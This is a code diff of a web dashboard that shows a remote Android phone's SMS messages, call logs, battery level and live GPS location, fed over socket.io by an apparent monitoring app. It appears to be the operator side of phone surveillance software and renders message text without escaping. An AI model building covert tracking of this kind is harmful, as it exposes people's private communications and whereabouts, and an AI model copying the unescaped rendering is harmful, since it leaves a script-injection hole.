@@ -4,32 +4,50 @@
     <meta charset="UTF-8">
     <title>Advanced Management Console</title>
     <script src="/socket.io/socket.io.js"></script>
+    
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    
     <style>
         :root { --bg: #f4f7f6; --sidebar: #2c3e50; --accent: #1abc9c; --white: #fff; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: var(--bg); }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; background: var(--bg); height: 100vh; overflow: hidden; }
+        
+        /* Sidebar Navigation */
         .sidebar { width: 250px; background: var(--sidebar); height: 100vh; position: fixed; color: white; }
-        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; color: #bdc3c7; }
+        .sidebar-header { padding: 25px; font-weight: bold; color: var(--accent); border-bottom: 1px solid #34495e; font-size: 1.2rem; }
+        .nav-item { padding: 15px 20px; cursor: pointer; border-bottom: 1px solid #34495e; color: #bdc3c7; transition: 0.2s; }
         .nav-item:hover, .nav-item.active { background: var(--accent); color: white; }
+
+        /* Header / GPS Bar */
         .fixed-header { position: fixed; top: 0; left: 250px; right: 0; height: 90px; background: var(--white); border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center; padding: 0 30px; z-index: 1000; }
-        .main-content { margin-left: 250px; padding-top: 110px; flex: 1; padding-inline: 30px; }
-        .view { display: none; }
+        .gps-info { font-size: 0.9rem; color: #7f8c8d; }
+        .gps-addr { font-weight: bold; color: #2c3e50; display: block; margin-bottom: 3px; font-size: 1rem; }
+
+        /* Main Content Container */
+        .main-content { margin-left: 250px; padding-top: 110px; flex: 1; height: 100vh; overflow-y: auto; padding-inline: 30px; box-sizing: border-box; }
+        .view { display: none; padding-bottom: 40px; }
         .view.active { display: block; }
-        .search-bar { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 6px; }
+
+        /* Tables and Search */
+        .search-bar { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 6px; font-size: 1rem; outline: none; }
+        .search-bar:focus { border-color: var(--accent); }
         table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        th { background: #f8f9fa; padding: 12px; text-align: left; border-bottom: 2px solid #eee; font-size: 0.8rem; color: #777; }
-        td { padding: 12px; border-bottom: 1px solid #eee; color: #333 !important; }
+        th { background: #f8f9fa; padding: 15px; text-align: left; border-bottom: 2px solid #eee; font-size: 0.8rem; color: #777; text-transform: uppercase; }
+        td { padding: 15px; border-bottom: 1px solid #eee; color: #333 !important; font-size: 0.95rem; }
+        
+        /* Status Colors */
         .Incoming { color: #27ae60 !important; font-weight: bold; }
         .Outgoing { color: #2980b9 !important; font-weight: bold; }
         .Missed { color: #e74c3c !important; font-weight: bold; }
-        #map { width: 100%; height: 500px; border-radius: 10px; border: 1px solid #ddd; }
+
+        #map { width: 100%; height: 550px; border-radius: 10px; border: 1px solid #ddd; background: #eee; }
+        .status-dot { font-size: 2.5rem; transition: color 0.5s; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <div style="padding: 25px; font-weight: bold; color: var(--accent); border-bottom: 1px solid #34495e;">CONSOLE v3</div>
+    <div class="sidebar-header">SYSTEM CONSOLE</div>
     <div class="nav-item active" onclick="showView('dash')">📊 Dashboard</div>
     <div class="nav-item" onclick="showView('sms')">✉️ SMS Logs</div>
     <div class="nav-item" onclick="showView('calls')">📞 Call Logs</div>
@@ -37,91 +55,170 @@
 </div>
 
 <div class="fixed-header">
-    <div style="font-size: 0.9rem; color: #7f8c8d;">
-        <span id="gps-addr" style="font-weight: bold; color: #2c3e50; display: block;">GPS Syncing...</span>
-        Accuracy: <span id="gps-acc">--</span>m | <span id="gps-time">--</span>
+    <div class="gps-info">
+        <span id="gps-addr" class="gps-addr">Waiting for device location...</span>
+        Accuracy: <span id="gps-acc">--</span>m | Fix Time: <span id="gps-time">--</span>
     </div>
     <div style="display:flex; align-items:center; gap:20px;">
-        <div id="status-dot" style="font-size:2.5rem; color:#e74c3c;">●</div>
-        <div style="font-size:1.5rem;"><span id="pct">--</span>% 🔋</div>
+        <div id="status-dot" class="status-dot" style="color:#e74c3c;">●</div>
+        <div style="font-size:1.8rem; font-weight: 300;"><span id="pct">--</span>% 🔋</div>
     </div>
 </div>
 
 <div class="main-content">
-    <div id="dash" class="view active"><h2>Device Status Nominal</h2></div>
+    <div id="dash" class="view active">
+        <h2>Device Overview</h2>
+        <div style="background: white; padding: 20px; border-radius: 8px; border: 1px solid #ddd;">
+            <p>Connection Status: <b id="connection-status">Disconnected</b></p>
+            <p>Ensure the Android app is running and <b>Background Location</b> is set to "Allow all the time".</p>
+        </div>
+    </div>
 
     <div id="sms" class="view">
-        <input type="text" id="smsSearch" class="search-bar" placeholder="Search SMS..." onkeyup="filter('sms')">
+        <h2>Communication Logs (SMS)</h2>
+        <input type="text" id="smsSearch" class="search-bar" placeholder="Search by number or message..." onkeyup="filter('sms')">
         <table>
-            <thead><tr><th>Type</th><th>Number</th><th>Message</th><th>Date</th></tr></thead>
+            <thead>
+                <tr><th style="width:15%">Type</th><th style="width:20%">Number</th><th>Message</th><th style="width:20%">Date</th></tr>
+            </thead>
             <tbody id="sms-table"></tbody>
         </table>
     </div>
 
     <div id="calls" class="view">
-        <input type="text" id="callSearch" class="search-bar" placeholder="Search Call Logs..." onkeyup="filter('calls')">
+        <h2>Telephony Logs (Calls)</h2>
+        <input type="text" id="callSearch" class="search-bar" placeholder="Search by name or number..." onkeyup="filter('calls')">
         <table>
-            <thead><tr><th>Type</th><th>Number</th><th>Name</th><th>Duration</th><th>Date</th></tr></thead>
+            <thead>
+                <tr><th style="width:15%">Type</th><th style="width:20%">Number</th><th>Name</th><th style="width:10%">Duration</th><th style="width:20%">Date</th></tr>
+            </thead>
             <tbody id="call-table"></tbody>
         </table>
     </div>
 
-    <div id="map-view" class="view"><div id="map"></div></div>
+    <div id="map-view" class="view">
+        <h2>Live GPS Tracking</h2>
+        <div id="map"></div>
+    </div>
 </div>
 
 <script>
     const socket = io();
     let map, marker, allSMS = [], allCalls = [];
 
+    // View Switching Logic
     function showView(id) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        if(id === 'map-view') { setTimeout(() => { if(!map) initMap(); map.invalidateSize(); }, 300); }
+        
+        const targetView = document.getElementById(id);
+        targetView.classList.add('active');
+        event.currentTarget.classList.add('active');
+
+        // Map Refresh
+        if(id === 'map-view') {
+            setTimeout(() => { 
+                if(!map) initMap();
+                map.invalidateSize(); 
+            }, 300);
+        }
+
+        // Data Requests
         if(id === 'sms') socket.emit('get-sms-request');
         if(id === 'calls') socket.emit('get-call-log-request');
     }
 
     function initMap() {
         map = L.map('map').setView([0, 0], 2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap'
+        }).addTo(map);
         marker = L.marker([0, 0]).addTo(map);
     }
 
+    // --- SOCKET LISTENERS (Matched to MonitorService.java) ---
+
+    // GPS Fix: Matches Java's mSocket.emit("gps-update", data)
     socket.on('gps-update', (data) => {
         document.getElementById('gps-addr').innerText = data.address;
         document.getElementById('gps-acc').innerText = data.accuracy;
         document.getElementById('gps-time').innerText = data.time;
-        if(map && data.lat) {
+        
+        if(data.lat && data.lng) {
             const pos = [data.lat, data.lng];
-            map.setView(pos, 16); marker.setLatLng(pos);
-            document.getElementById('status-dot').style.color = "#2ecc71";
+            if(!map) initMap();
+            map.setView(pos, 16);
+            marker.setLatLng(pos);
+            updateStatus(true);
         }
     });
 
+    // Battery: Matches Java's mSocket.emit("battery-status", data)
     socket.on('battery-status', (data) => {
         document.getElementById('pct').innerText = data.percent;
-        document.getElementById('status-dot').style.color = "#2ecc71";
+        updateStatus(true);
     });
 
-    socket.on('sms-data-log', (data) => { allSMS = data; render('sms', data); });
-    socket.on('call-log-data', (data) => { allCalls = data; render('calls', data); });
+    // SMS: Matches Java's mSocket.emit("sms-data-log", smsList)
+    socket.on('sms-data-log', (data) => {
+        allSMS = data;
+        render('sms', data);
+    });
+
+    // Calls: Matches Java's mSocket.emit("call-log-data", callList)
+    socket.on('call-log-data', (data) => {
+        allCalls = data;
+        render('calls', data);
+    });
+
+    function updateStatus(isOnline) {
+        document.getElementById('status-dot').style.color = isOnline ? "#2ecc71" : "#e74c3c";
+        document.getElementById('connection-status').innerText = isOnline ? "Connected" : "Disconnected";
+        document.getElementById('connection-status').style.color = isOnline ? "#2ecc71" : "#e74c3c";
+    }
+
+    // --- UI RENDERING ---
 
     function render(type, data) {
         const body = document.getElementById(type + '-table');
+        if (!data || data.length === 0) {
+            body.innerHTML = `<tr><td colspan="5" style="text-align:center">No data received from device.</td></tr>`;
+            return;
+        }
+
         if (type === 'sms') {
-            body.innerHTML = data.map(m => `<tr><td class="${m.type}">${m.type}</td><td>${m.address}</td><td>${m.body}</td><td>${new Date(m.date).toLocaleString()}</td></tr>`).join('');
+            body.innerHTML = data.map(m => `
+                <tr>
+                    <td class="${m.type}">${m.type}</td>
+                    <td><b>${m.address}</b></td>
+                    <td>${m.body}</td>
+                    <td style="color:#7f8c8d; font-size:0.85rem;">${new Date(m.date).toLocaleString()}</td>
+                </tr>
+            `).join('');
         } else {
-            body.innerHTML = data.map(c => `<tr><td class="${c.type}">${c.type}</td><td>${c.number}</td><td>${c.name || 'Unknown'}</td><td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td></tr>`).join('');
+            body.innerHTML = data.map(c => `
+                <tr>
+                    <td class="${c.type}">${c.type}</td>
+                    <td><b>${c.number}</b></td>
+                    <td>${c.name || '<span style="color:#bbb">Unknown</span>'}</td>
+                    <td>${c.duration}</td>
+                    <td style="color:#7f8c8d; font-size:0.85rem;">${new Date(c.date).toLocaleString()}</td>
+                </tr>
+            `).join('');
         }
     }
 
     function filter(type) {
         const query = document.getElementById(type === 'sms' ? 'smsSearch' : 'callSearch').value.toLowerCase();
         const list = type === 'sms' ? allSMS : allCalls;
-        const filtered = list.filter(item => Object.values(item).some(val => String(val).toLowerCase().includes(query)));
+        const filtered = list.filter(item => 
+            Object.values(item).some(val => String(val).toLowerCase().includes(query))
+        );
         render(type, filtered);
     }
+
+    socket.on('disconnect', () => updateStatus(false));
 </script>
+
 </body>
 </html>
